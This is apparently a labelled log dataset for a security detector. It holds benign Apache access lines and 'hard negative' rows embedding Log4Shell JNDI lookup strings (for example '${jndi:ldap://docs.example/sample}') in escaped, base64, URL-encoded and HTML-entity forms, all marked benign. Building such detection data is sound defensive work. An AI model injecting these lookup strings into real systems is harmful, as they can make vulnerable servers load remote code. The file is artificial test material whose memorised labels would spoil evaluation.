id,timestamp,source,raw_log,normalized_log,label,attack_family,obfuscation_type,field,split,risk_level
LS-003462,2026-05-17,benign_apache_format,"191.84.251.111 - - [11/May/2015:13:43:37 +0000] ""GET /static/app.js HTTP/1.1"" 200 187750 ""https://example.com/"" ""Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_1) AppleWebKit/537.36 Chrome/32.0 Safari/537.36""","191.84.251.111 - - [11/may/2015:13:43:37 +0000] ""get /static/app.js http/1.1"" 200 187750 ""https://example.com/"" ""mozilla/5.0 (macintosh; intel mac os x 10_9_1) applewebkit/537.36 chrome/32.0 safari/537.36""",0,benign,benign,external_like_benign_access_log,val,low
LS-003463,2026-05-17,benign_apache_format,"206.56.251.169 - - [12/May/2015:14:50:50 +0000] ""GET /blog/security-hardening HTTP/1.1"" 404 141526 ""https://semicomplete.com/presentations/logstash-monitorama-2013/"" ""Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_1) AppleWebKit/537.36 Chrome/32.0 Safari/537.36""","206.56.251.169 - - [12/may/2015:14:50:50 +0000] ""get /blog/security-hardening http/1.1"" 404 141526 ""https://semicomplete.com/presentations/logstash-monitorama-2013/"" ""mozilla/5.0 (macintosh; intel mac os x 10_9_1) applewebkit/537.36 chrome/32.0 safari/537.36""",0,benign,benign,external_like_benign_access_log,val,low
LS-003464,2026-05-17,benign_apache_format,"132.80.28.101 - - [13/May/2015:15:57:03 +0000] ""GET /images/logo.png HTTP/1.1"" 301 155066 ""https://example.com/"" ""Java/11.0.13""","132.80.28.101 - - [13/may/2015:15:57:03 +0000] ""get /images/logo.png http/1.1"" 301 155066 ""https://example.com/"" ""java/11.0.13""",0,benign,benign,external_like_benign_access_log,val,low
LS-003465,2026-05-17,benign_apache_format,"207.145.164.16 - - [14/May/2015:16:04:16 +0000] ""GET / HTTP/1.1"" 304 11955 ""-"" ""Java/11.0.13""","207.145.164.16 - - [14/may/2015:16:04:16 +0000] ""get / http/1.1"" 304 11955 ""-"" ""java/11.0.13""",0,benign,benign,external_like_benign_access_log,val,low
LS-003466,2026-05-17,benign_apache_format,"100.13.174.98 - - [15/May/2015:17:11:29 +0000] ""GET /index.html HTTP/1.1"" 301 90605 ""https://example.com/"" ""Go-http-client/1.1""","100.13.174.98 - - [15/may/2015:17:11:29 +0000] ""get /index.html http/1.1"" 301 90605 ""https://example.com/"" ""go-http-client/1.1""",0,benign,benign,external_like_benign_access_log,val,low
LS-003467,2026-05-17,benign_apache_format,"100.28.125.64 - - [16/May/2015:18:18:42 +0000] ""GET /static/style.css HTTP/1.1"" 404 81943 ""https://semicomplete.com/presentations/logstash-monitorama-2013/"" ""Mozilla/5.0 Safari/605.1.15""","100.28.125.64 - - [16/may/2015:18:18:42 +0000] ""get /static/style.css http/1.1"" 404 81943 ""https://semicomplete.com/presentations/logstash-monitorama-2013/"" ""mozilla/5.0 safari/605.1.15""",0,benign,benign,external_like_benign_access_log,val,low
LS-003468,2026-05-17,benign_apache_format,"187.33.156.30 - - [17/May/2015:19:25:55 +0000] ""GET /api/products?id=123 HTTP/1.1"" 200 5295 ""https://semicomplete.com/presentations/logstash-monitorama-2013/"" ""Java/11.0.13""","187.33.156.30 - - [17/may/2015:19:25:55 +0000] ""get /api/products?id=123 http/1.1"" 200 5295 ""https://semicomplete.com/presentations/logstash-monitorama-2013/"" ""java/11.0.13""",0,benign,benign,external_like_benign_access_log,val,low
LS-003469,2026-05-17,benign_apache_format,"20.235.216.146 - - [18/May/2015:20:32:08 +0000] ""GET /blog/security-hardening HTTP/1.1"" 301 70020 ""-"" ""Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_1) AppleWebKit/537.36 Chrome/32.0 Safari/537.36""","20.235.216.146 - - [18/may/2015:20:32:08 +0000] ""get /blog/security-hardening http/1.1"" 301 70020 ""-"" ""mozilla/5.0 (macintosh; intel mac os x 10_9_1) applewebkit/537.36 chrome/32.0 safari/537.36""",0,benign,benign,external_like_benign_access_log,val,low
LS-003470,2026-05-17,benign_apache_format,"161.11.162.97 - - [19/May/2015:21:39:21 +0000] ""GET /docs/logging-best-practices HTTP/1.1"" 301 84648 ""https://semicomplete.com/presentations/logstash-monitorama-2013/"" ""Mozilla/5.0 Safari/605.1.15""","161.11.162.97 - - [19/may/2015:21:39:21 +0000] ""get /docs/logging-best-practices http/1.1"" 301 84648 ""https://semicomplete.com/presentations/logstash-monitorama-2013/"" ""mozilla/5.0 safari/605.1.15""",0,benign,benign,external_like_benign_access_log,val,low
LS-003471,2026-05-17,benign_apache_format,"217.250.51.177 - - [20/May/2015:22:46:34 +0000] ""GET /static/style.css HTTP/1.1"" 200 130343 ""https://semicomplete.com/presentations/logstash-monitorama-2013/"" ""Java/11.0.13""","217.250.51.177 - - [20/may/2015:22:46:34 +0000] ""get /static/style.css http/1.1"" 200 130343 ""https://semicomplete.com/presentations/logstash-monitorama-2013/"" ""java/11.0.13""",0,benign,benign,external_like_benign_access_log,val,low
LS-003472,2026-05-17,benign_apache_format,"53.153.186.249 - - [21/May/2015:23:53:47 +0000] ""GET /presentations/logstash-monitorama-2013/images/kibana-search.png HTTP/1.1"" 200 130400 ""https://semicomplete.com/presentations/logstash-monitorama-2013/"" ""Mozilla/5.0 Safari/605.1.15""","53.153.186.249 - - [21/may/2015:23:53:47 +0000] ""get /presentations/logstash-monitorama-2013/images/kibana-search.png http/1.1"" 200 130400 ""https://semicomplete.com/presentations/logstash-monitorama-2013/"" ""mozilla/5.0 safari/605.1.15""",0,benign,benign,external_like_benign_access_log,val,low
LS-003993,2026-05-17,hard_negative,GET /docs/search?q=%24%7Bjndi%3Aldap%3A%2F%2Fdocs.example%2Fsample%7D&purpose=defensive-note HTTP/1.1 Host: docs.local trace_id=hardneg-val-0000,get /docs/search?q=${jndi:ldap://docs.example/sample}&purpose=defensive-note http/1.1 host: docs.local trace_id=hardneg-val-0000,0,benign,benign_encoded_search_query,mixed,val,low
LS-003994,2026-05-17,hard_negative,DEBUG artifact payload_b64=JHtqbmRpOmxkYXA6Ly9zYW1wbGUuaW52YWxpZC9zYW1wbGV9 action=store_sample decode_at_runtime=false trace_id=hardneg-val-0001,debug artifact payload_b64=jhtqbmrpomxkyxa6ly9zyw1wbguuaw52ywxpzc9zyw1wbgv9 action=store_sample decode_at_runtime=false trace_id=hardneg-val-0001,0,benign,benign_base64_artifact,mixed,val,low
LS-003995,2026-05-17,hard_negative,ASSERT literal_payload_string equals '${jndi:ldap://training.local/sample}' suite=parser_documentation mode=no_eval trace_id=hardneg-val-0002,assert literal_payload_string equals '${jndi:ldap://training.local/sample}' suite=parser_documentation mode=no_eval trace_id=hardneg-val-0002,0,benign,benign_unit_test_fixture,mixed,val,low
LS-003996,2026-05-17,hard_negative,TRAINING note tokens '$' '{' 'jndi' ':ldap://' 'docs.example' are shown separately for awareness trace_id=hardneg-val-0003,training note tokens '$' '{' 'jndi' ':ldap://' 'docs.example' are shown separately for awareness trace_id=hardneg-val-0003,0,benign,benign_fragmented_tutorial_text,mixed,val,low
LS-003997,2026-05-17,hard_negative,ASSERT literal_payload_string equals '${jndi:ldap://training.local/sample}' suite=parser_documentation mode=no_eval trace_id=hardneg-val-0004,assert literal_payload_string equals '${jndi:ldap://training.local/sample}' suite=parser_documentation mode=no_eval trace_id=hardneg-val-0004,0,benign,benign_unit_test_fixture,mixed,val,low
LS-003998,2026-05-17,hard_negative,SECURITY_REVIEW indicator_sample='${jndi:ldap://kb.internal/sample}' origin=threat_report status=not_seen_in_request trace_id=hardneg-val-0005,security_review indicator_sample='${jndi:ldap://kb.internal/sample}' origin=threat_report status=not_seen_in_request trace_id=hardneg-val-0005,0,benign,benign_scanner_report,mixed,val,low
LS-003999,2026-05-17,hard_negative,"WARN log4j notes mention JNDI, LDAP, RMI, and lookup syntax as separate documentation terms trace_id=hardneg-val-0006","warn log4j notes mention jndi, ldap, rmi, and lookup syntax as separate documentation terms trace_id=hardneg-val-0006",0,benign,benign_keyword_only,mixed,val,low
LS-004000,2026-05-17,hard_negative,INFO escaped_code_sample value='\${jndi:ldap://playbook.local/escaped}' source=developer_guide trace_id=hardneg-val-0007,info escaped_code_sample value='\${jndi:ldap://playbook.local/escaped}' source=developer_guide trace_id=hardneg-val-0007,0,benign,benign_json_escaped_payload,mixed,val,low
LS-004001,2026-05-17,hard_negative,GET /docs/search?q=%24%7Bjndi%3Aldap%3A%2F%2Ftraining.local%2Fsample%7D&purpose=defensive-note HTTP/1.1 Host: docs.local trace_id=hardneg-val-0008,get /docs/search?q=${jndi:ldap://training.local/sample}&purpose=defensive-note http/1.1 host: docs.local trace_id=hardneg-val-0008,0,benign,benign_encoded_search_query,mixed,val,low
LS-004002,2026-05-17,hard_negative,GET /preview?html=&#36;&#123;jndi&#58;ldap&#58;&#47;&#47;defensive-lab.example&#47;sample&#125;&escaped=true HTTP/1.1 Host: cms.local trace_id=hardneg-val-0009,get /preview?html=${jndi:ldap://defensive-lab.example/sample}&escaped=true http/1.1 host: cms.local trace_id=hardneg-val-0009,0,benign,benign_html_entity_documentation,mixed,val,low
LS-004003,2026-05-17,hard_negative,DEBUG artifact payload_b64=JHtqbmRpOmxkYXA6Ly9kZWZlbnNpdmUtbGFiLmV4YW1wbGUvc2FtcGxlfQ== action=store_sample decode_at_runtime=false trace_id=hardneg-val-0010,debug artifact payload_b64=jhtqbmrpomxkyxa6ly9kzwzlbnnpdmutbgfilmv4yw1wbguvc2ftcgxlfq== action=store_sample decode_at_runtime=false trace_id=hardneg-val-0010,0,benign,benign_base64_artifact,mixed,val,low
LS-004004,2026-05-17,hard_negative,SECURITY_REVIEW indicator_sample='${jndi:ldap://kb.internal/sample}' origin=threat_report status=not_seen_in_request trace_id=hardneg-val-0011,security_review indicator_sample='${jndi:ldap://kb.internal/sample}' origin=threat_report status=not_seen_in_request trace_id=hardneg-val-0011,0,benign,benign_scanner_report,mixed,val,low
LS-004005,2026-05-17,hard_negative,SECURITY_REVIEW indicator_sample='${jndi:ldap://defensive-lab.example/sample}' origin=threat_report status=not_seen_in_request trace_id=hardneg-val-0012,security_review indicator_sample='${jndi:ldap://defensive-lab.example/sample}' origin=threat_report status=not_seen_in_request trace_id=hardneg-val-0012,0,benign,benign_scanner_report,mixed,val,low
LS-004006,2026-05-17,hard_negative,DEBUG artifact payload_b64=JHtqbmRpOmxkYXA6Ly90cmFpbmluZy5sb2NhbC9zYW1wbGV9 action=store_sample decode_at_runtime=false trace_id=hardneg-val-0013,debug artifact payload_b64=jhtqbmrpomxkyxa6ly90cmfpbmluzy5sb2nhbc9zyw1wbgv9 action=store_sample decode_at_runtime=false trace_id=hardneg-val-0013,0,benign,benign_base64_artifact,mixed,val,low
LS-004007,2026-05-17,hard_negative,TRAINING note tokens '$' '{' 'jndi' ':ldap://' 'playbook.local' are shown separately for awareness trace_id=hardneg-val-0014,training note tokens '$' '{' 'jndi' ':ldap://' 'playbook.local' are shown separately for awareness trace_id=hardneg-val-0014,0,benign,benign_fragmented_tutorial_text,mixed,val,low
LS-004008,2026-05-17,hard_negative,GET /wiki/log4j?sample=%u0024%u007Bjndi%u003Aldap%u003A%u002F%u002Fplaybook.local%u002Fsample%u007D&view=copyable-text HTTP/1.1 Host: training.local trace_id=hardneg-val-0015,get /wiki/log4j?sample=%u0024%u007bjndi%u003aldap%u003a%u002f%u002fplaybook.local%u002fsample%u007d&view=copyable-text http/1.1 host: training.local trace_id=hardneg-val-0015,0,benign,benign_percent_u_documentation,mixed,val,low
LS-004009,2026-05-17,hard_negative,INFO markdown_code_block value='${jndi:ldap://kb.internal/sample}' render_context=documentation_only trace_id=hardneg-val-0016,info markdown_code_block value='${jndi:ldap://kb.internal/sample}' render_context=documentation_only trace_id=hardneg-val-0016,0,benign,benign_documentation_example,mixed,val,low
LS-004010,2026-05-17,hard_negative,DEBUG artifact payload_b64=JHtqbmRpOmxkYXA6Ly90cmFpbmluZy5sb2NhbC9zYW1wbGV9 action=store_sample decode_at_runtime=false trace_id=hardneg-val-0017,debug artifact payload_b64=jhtqbmrpomxkyxa6ly90cmfpbmluzy5sb2nhbc9zyw1wbgv9 action=store_sample decode_at_runtime=false trace_id=hardneg-val-0017,0,benign,benign_base64_artifact,mixed,val,low
LS-004011,2026-05-17,hard_negative,GET /docs/log4j-mitigation HTTP/1.1 trace_id=hardneg-val-0018,get /docs/log4j-mitigation http/1.1 trace_id=hardneg-val-0018,0,benign,documentation,mixed,val,low
LS-004012,2026-05-17,hard_negative,"INFO json_template={""example"":""\\${jndi:ldap://docs.example/json}"",""literal"":true} trace_id=hardneg-val-0019","info json_template={""example"":""\\${jndi:ldap://docs.example/json}"",""literal"":true} trace_id=hardneg-val-0019",0,benign,benign_json_escaped_payload,mixed,val,low
LS-004013,2026-05-17,hard_negative,GET /kb/log4shell?sample=%2524%257Bjndi%253Aldap%253A%252F%252Fplaybook.local%252Fsample%257D&display=literal HTTP/1.1 Host: kb.local trace_id=hardneg-val-0020,get /kb/log4shell?sample=${jndi:ldap://playbook.local/sample}&display=literal http/1.1 host: kb.local trace_id=hardneg-val-0020,0,benign,benign_encoded_documentation,mixed,val,low
LS-004014,2026-05-17,hard_negative,GET /docs/search?q=%24%7Bjndi%3Aldap%3A%2F%2Fdocs.example%2Fsample%7D&purpose=defensive-note HTTP/1.1 Host: docs.local trace_id=hardneg-val-0021,get /docs/search?q=${jndi:ldap://docs.example/sample}&purpose=defensive-note http/1.1 host: docs.local trace_id=hardneg-val-0021,0,benign,benign_encoded_search_query,mixed,val,low
LS-004015,2026-05-17,hard_negative,SECURITY_REVIEW indicator_sample='${jndi:ldap://sample.invalid/sample}' origin=threat_report status=not_seen_in_request trace_id=hardneg-val-0022,security_review indicator_sample='${jndi:ldap://sample.invalid/sample}' origin=threat_report status=not_seen_in_request trace_id=hardneg-val-0022,0,benign,benign_scanner_report,mixed,val,low
LS-004016,2026-05-17,hard_negative,GET /preview?html=&#36;&#123;jndi&#58;ldap&#58;&#47;&#47;defensive-lab.example&#47;sample&#125;&escaped=true HTTP/1.1 Host: cms.local trace_id=hardneg-val-0023,get /preview?html=${jndi:ldap://defensive-lab.example/sample}&escaped=true http/1.1 host: cms.local trace_id=hardneg-val-0023,0,benign,benign_html_entity_documentation,mixed,val,low
LS-004017,2026-05-17,hard_negative,"WARN log4j notes mention JNDI, LDAP, RMI, and lookup syntax as separate documentation terms trace_id=hardneg-val-0024","warn log4j notes mention jndi, ldap, rmi, and lookup syntax as separate documentation terms trace_id=hardneg-val-0024",0,benign,benign_keyword_only,mixed,val,low
LS-004018,2026-05-17,hard_negative,"WARN log4j notes mention JNDI, LDAP, RMI, and lookup syntax as separate documentation terms trace_id=hardneg-val-0025","warn log4j notes mention jndi, ldap, rmi, and lookup syntax as separate documentation terms trace_id=hardneg-val-0025",0,benign,benign_keyword_only,mixed,val,low
LS-004019,2026-05-17,hard_negative,"INFO json_template={""example"":""\\${jndi:ldap://kb.internal/json}"",""literal"":true} trace_id=hardneg-val-0026","info json_template={""example"":""\\${jndi:ldap://kb.internal/json}"",""literal"":true} trace_id=hardneg-val-0026",0,benign,benign_json_escaped_payload,mixed,val,low
LS-004020,2026-05-17,hard_negative,INFO escaped_code_sample value='\${jndi:ldap://defensive-lab.example/escaped}' source=developer_guide trace_id=hardneg-val-0027,info escaped_code_sample value='\${jndi:ldap://defensive-lab.example/escaped}' source=developer_guide trace_id=hardneg-val-0027,0,benign,benign_json_escaped_payload,mixed,val,low
LS-004021,2026-05-17,hard_negative,ASSERT literal_payload_string equals '${jndi:ldap://playbook.local/sample}' suite=parser_documentation mode=no_eval trace_id=hardneg-val-0028,assert literal_payload_string equals '${jndi:ldap://playbook.local/sample}' suite=parser_documentation mode=no_eval trace_id=hardneg-val-0028,0,benign,benign_unit_test_fixture,mixed,val,low
LS-004022,2026-05-17,hard_negative,GET /wiki/log4j?sample=%u0024%u007Bjndi%u003Aldap%u003A%u002F%u002Fplaybook.local%u002Fsample%u007D&view=copyable-text HTTP/1.1 Host: training.local trace_id=hardneg-val-0029,get /wiki/log4j?sample=%u0024%u007bjndi%u003aldap%u003a%u002f%u002fplaybook.local%u002fsample%u007d&view=copyable-text http/1.1 host: training.local trace_id=hardneg-val-0029,0,benign,benign_percent_u_documentation,mixed,val,low
LS-004023,2026-05-17,hard_negative,INFO markdown_code_block value='${jndi:ldap://playbook.local/sample}' render_context=documentation_only trace_id=hardneg-val-0030,info markdown_code_block value='${jndi:ldap://playbook.local/sample}' render_context=documentation_only trace_id=hardneg-val-0030,0,benign,benign_documentation_example,mixed,val,low
LS-004024,2026-05-17,hard_negative,DEBUG artifact payload_b64=JHtqbmRpOmxkYXA6Ly9kZWZlbnNpdmUtbGFiLmV4YW1wbGUvc2FtcGxlfQ== action=store_sample decode_at_runtime=false trace_id=hardneg-val-0031,debug artifact payload_b64=jhtqbmrpomxkyxa6ly9kzwzlbnnpdmutbgfilmv4yw1wbguvc2ftcgxlfq== action=store_sample decode_at_runtime=false trace_id=hardneg-val-0031,0,benign,benign_base64_artifact,mixed,val,low
LS-004025,2026-05-17,hard_negative,Security scanner report mentions escaped example \${jndi:ldap://example.com/a} trace_id=hardneg-val-0032,security scanner report mentions escaped example \${jndi:ldap://example.com/a} trace_id=hardneg-val-0032,0,benign,escaped_payload,mixed,val,low
LS-004026,2026-05-17,hard_negative,INFO markdown_code_block value='${jndi:ldap://docs.example/sample}' render_context=documentation_only trace_id=hardneg-val-0033,info markdown_code_block value='${jndi:ldap://docs.example/sample}' render_context=documentation_only trace_id=hardneg-val-0033,0,benign,benign_documentation_example,mixed,val,low
LS-004027,2026-05-17,hard_negative,INFO escaped_code_sample value='\${jndi:ldap://kb.internal/escaped}' source=developer_guide trace_id=hardneg-val-0034,info escaped_code_sample value='\${jndi:ldap://kb.internal/escaped}' source=developer_guide trace_id=hardneg-val-0034,0,benign,benign_json_escaped_payload,mixed,val,low
LS-004028,2026-05-17,hard_negative,GET /wiki/log4j?sample=%u0024%u007Bjndi%u003Aldap%u003A%u002F%u002Fplaybook.local%u002Fsample%u007D&view=copyable-text HTTP/1.1 Host: training.local trace_id=hardneg-val-0035,get /wiki/log4j?sample=%u0024%u007bjndi%u003aldap%u003a%u002f%u002fplaybook.local%u002fsample%u007d&view=copyable-text http/1.1 host: training.local trace_id=hardneg-val-0035,0,benign,benign_percent_u_documentation,mixed,val,low
LS-004029,2026-05-17,hard_negative,GET /docs/search?q=%24%7Bjndi%3Aldap%3A%2F%2Fsample.invalid%2Fsample%7D&purpose=defensive-note HTTP/1.1 Host: docs.local trace_id=hardneg-val-0036,get /docs/search?q=${jndi:ldap://sample.invalid/sample}&purpose=defensive-note http/1.1 host: docs.local trace_id=hardneg-val-0036,0,benign,benign_encoded_search_query,mixed,val,low
LS-004030,2026-05-17,hard_negative,ASSERT literal_payload_string equals '${jndi:ldap://kb.internal/sample}' suite=parser_documentation mode=no_eval trace_id=hardneg-val-0037,assert literal_payload_string equals '${jndi:ldap://kb.internal/sample}' suite=parser_documentation mode=no_eval trace_id=hardneg-val-0037,0,benign,benign_unit_test_fixture,mixed,val,low
LS-004031,2026-05-17,hard_negative,ASSERT literal_payload_string equals '${jndi:ldap://sample.invalid/sample}' suite=parser_documentation mode=no_eval trace_id=hardneg-val-0038,assert literal_payload_string equals '${jndi:ldap://sample.invalid/sample}' suite=parser_documentation mode=no_eval trace_id=hardneg-val-0038,0,benign,benign_unit_test_fixture,mixed,val,low
LS-004032,2026-05-17,hard_negative,"INFO json_template={""example"":""\\${jndi:ldap://defensive-lab.example/json}"",""literal"":true} trace_id=hardneg-val-0039","info json_template={""example"":""\\${jndi:ldap://defensive-lab.example/json}"",""literal"":true} trace_id=hardneg-val-0039",0,benign,benign_json_escaped_payload,mixed,val,low
LS-004033,2026-05-17,hard_negative,GET /wiki/log4j?sample=%u0024%u007Bjndi%u003Aldap%u003A%u002F%u002Ftraining.local%u002Fsample%u007D&view=copyable-text HTTP/1.1 Host: training.local trace_id=hardneg-val-0040,get /wiki/log4j?sample=%u0024%u007bjndi%u003aldap%u003a%u002f%u002ftraining.local%u002fsample%u007d&view=copyable-text http/1.1 host: training.local trace_id=hardneg-val-0040,0,benign,benign_percent_u_documentation,mixed,val,low
LS-004034,2026-05-17,hard_negative,GET /preview?html=&#36;&#123;jndi&#58;ldap&#58;&#47;&#47;sample.invalid&#47;sample&#125;&escaped=true HTTP/1.1 Host: cms.local trace_id=hardneg-val-0041,get /preview?html=${jndi:ldap://sample.invalid/sample}&escaped=true http/1.1 host: cms.local trace_id=hardneg-val-0041,0,benign,benign_html_entity_documentation,mixed,val,low
LS-004035,2026-05-17,hard_negative,"WARN log4j notes mention JNDI, LDAP, RMI, and lookup syntax as separate documentation terms trace_id=hardneg-val-0042","warn log4j notes mention jndi, ldap, rmi, and lookup syntax as separate documentation terms trace_id=hardneg-val-0042",0,benign,benign_keyword_only,mixed,val,low
LS-004036,2026-05-17,hard_negative,GET /wiki/log4j?sample=%u0024%u007Bjndi%u003Aldap%u003A%u002F%u002Ftraining.local%u002Fsample%u007D&view=copyable-text HTTP/1.1 Host: training.local trace_id=hardneg-val-0043,get /wiki/log4j?sample=%u0024%u007bjndi%u003aldap%u003a%u002f%u002ftraining.local%u002fsample%u007d&view=copyable-text http/1.1 host: training.local trace_id=hardneg-val-0043,0,benign,benign_percent_u_documentation,mixed,val,low
LS-004037,2026-05-17,hard_negative,"WARN log4j notes mention JNDI, LDAP, RMI, and lookup syntax as separate documentation terms trace_id=hardneg-val-0044","warn log4j notes mention jndi, ldap, rmi, and lookup syntax as separate documentation terms trace_id=hardneg-val-0044",0,benign,benign_keyword_only,mixed,val,low
LS-004038,2026-05-17,hard_negative,"WARN log4j notes mention JNDI, LDAP, RMI, and lookup syntax as separate documentation terms trace_id=hardneg-val-0045","warn log4j notes mention jndi, ldap, rmi, and lookup syntax as separate documentation terms trace_id=hardneg-val-0045",0,benign,benign_keyword_only,mixed,val,low
LS-004039,2026-05-17,hard_negative,GET /wiki/log4j?sample=%u0024%u007Bjndi%u003Aldap%u003A%u002F%u002Fplaybook.local%u002Fsample%u007D&view=copyable-text HTTP/1.1 Host: training.local trace_id=hardneg-val-0046,get /wiki/log4j?sample=%u0024%u007bjndi%u003aldap%u003a%u002f%u002fplaybook.local%u002fsample%u007d&view=copyable-text http/1.1 host: training.local trace_id=hardneg-val-0046,0,benign,benign_percent_u_documentation,mixed,val,low
LS-004040,2026-05-17,hard_negative,DEBUG artifact payload_b64=JHtqbmRpOmxkYXA6Ly9zYW1wbGUuaW52YWxpZC9zYW1wbGV9 action=store_sample decode_at_runtime=false trace_id=hardneg-val-0047,debug artifact payload_b64=jhtqbmrpomxkyxa6ly9zyw1wbguuaw52ywxpzc9zyw1wbgv9 action=store_sample decode_at_runtime=false trace_id=hardneg-val-0047,0,benign,benign_base64_artifact,mixed,val,low
LS-004041,2026-05-17,hard_negative,INFO markdown_code_block value='${jndi:ldap://training.local/sample}' render_context=documentation_only trace_id=hardneg-val-0048,info markdown_code_block value='${jndi:ldap://training.local/sample}' render_context=documentation_only trace_id=hardneg-val-0048,0,benign,benign_documentation_example,mixed,val,low
LS-004042,2026-05-17,hard_negative,INFO escaped_code_sample value='\${jndi:ldap://defensive-lab.example/escaped}' source=developer_guide trace_id=hardneg-val-0049,info escaped_code_sample value='\${jndi:ldap://defensive-lab.example/escaped}' source=developer_guide trace_id=hardneg-val-0049,0,benign,benign_json_escaped_payload,mixed,val,low
LS-004043,2026-05-17,hard_negative,INFO escaped_code_sample value='\${jndi:ldap://docs.example/escaped}' source=developer_guide trace_id=hardneg-val-0050,info escaped_code_sample value='\${jndi:ldap://docs.example/escaped}' source=developer_guide trace_id=hardneg-val-0050,0,benign,benign_json_escaped_payload,mixed,val,low
LS-004044,2026-05-17,hard_negative,ASSERT literal_payload_string equals '${jndi:ldap://sample.invalid/sample}' suite=parser_documentation mode=no_eval trace_id=hardneg-val-0051,assert literal_payload_string equals '${jndi:ldap://sample.invalid/sample}' suite=parser_documentation mode=no_eval trace_id=hardneg-val-0051,0,benign,benign_unit_test_fixture,mixed,val,low
LS-004045,2026-05-17,hard_negative,Security scanner report mentions escaped example \${jndi:ldap://example.com/a} trace_id=hardneg-val-0052,security scanner report mentions escaped example \${jndi:ldap://example.com/a} trace_id=hardneg-val-0052,0,benign,escaped_payload,mixed,val,low
LS-004046,2026-05-17,hard_negative,"INFO json_template={""example"":""\\${jndi:ldap://training.local/json}"",""literal"":true} trace_id=hardneg-val-0053","info json_template={""example"":""\\${jndi:ldap://training.local/json}"",""literal"":true} trace_id=hardneg-val-0053",0,benign,benign_json_escaped_payload,mixed,val,low
LS-004047,2026-05-17,hard_negative,GET /docs/search?q=%24%7Bjndi%3Aldap%3A%2F%2Ftraining.local%2Fsample%7D&purpose=defensive-note HTTP/1.1 Host: docs.local trace_id=hardneg-val-0054,get /docs/search?q=${jndi:ldap://training.local/sample}&purpose=defensive-note http/1.1 host: docs.local trace_id=hardneg-val-0054,0,benign,benign_encoded_search_query,mixed,val,low
LS-004048,2026-05-17,hard_negative,INFO markdown_code_block value='${jndi:ldap://kb.internal/sample}' render_context=documentation_only trace_id=hardneg-val-0055,info markdown_code_block value='${jndi:ldap://kb.internal/sample}' render_context=documentation_only trace_id=hardneg-val-0055,0,benign,benign_documentation_example,mixed,val,low
LS-004049,2026-05-17,hard_negative,GET /docs/search?q=%24%7Bjndi%3Aldap%3A%2F%2Fdefensive-lab.example%2Fsample%7D&purpose=defensive-note HTTP/1.1 Host: docs.local trace_id=hardneg-val-0056,get /docs/search?q=${jndi:ldap://defensive-lab.example/sample}&purpose=defensive-note http/1.1 host: docs.local trace_id=hardneg-val-0056,0,benign,benign_encoded_search_query,mixed,val,low
LS-004050,2026-05-17,hard_negative,DEBUG artifact payload_b64=JHtqbmRpOmxkYXA6Ly9rYi5pbnRlcm5hbC9zYW1wbGV9 action=store_sample decode_at_runtime=false trace_id=hardneg-val-0057,debug artifact payload_b64=jhtqbmrpomxkyxa6ly9ryi5pbnrlcm5hbc9zyw1wbgv9 action=store_sample decode_at_runtime=false trace_id=hardneg-val-0057,0,benign,benign_base64_artifact,mixed,val,low
LS-004051,2026-05-17,hard_negative,GET /docs/search?q=%24%7Bjndi%3Aldap%3A%2F%2Fdocs.example%2Fsample%7D&purpose=defensive-note HTTP/1.1 Host: docs.local trace_id=hardneg-val-0058,get /docs/search?q=${jndi:ldap://docs.example/sample}&purpose=defensive-note http/1.1 host: docs.local trace_id=hardneg-val-0058,0,benign,benign_encoded_search_query,mixed,val,low
LS-004052,2026-05-17,hard_negative,SECURITY_REVIEW indicator_sample='${jndi:ldap://training.local/sample}' origin=threat_report status=not_seen_in_request trace_id=hardneg-val-0059,security_review indicator_sample='${jndi:ldap://training.local/sample}' origin=threat_report status=not_seen_in_request trace_id=hardneg-val-0059,0,benign,benign_scanner_report,mixed,val,low
LS-004053,2026-05-17,hard_negative,SECURITY_REVIEW indicator_sample='${jndi:ldap://playbook.local/sample}' origin=threat_report status=not_seen_in_request trace_id=hardneg-val-0060,security_review indicator_sample='${jndi:ldap://playbook.local/sample}' origin=threat_report status=not_seen_in_request trace_id=hardneg-val-0060,0,benign,benign_scanner_report,mixed,val,low
LS-004054,2026-05-17,hard_negative,TRAINING note tokens '$' '{' 'jndi' ':ldap://' 'sample.invalid' are shown separately for awareness trace_id=hardneg-val-0061,training note tokens '$' '{' 'jndi' ':ldap://' 'sample.invalid' are shown separately for awareness trace_id=hardneg-val-0061,0,benign,benign_fragmented_tutorial_text,mixed,val,low
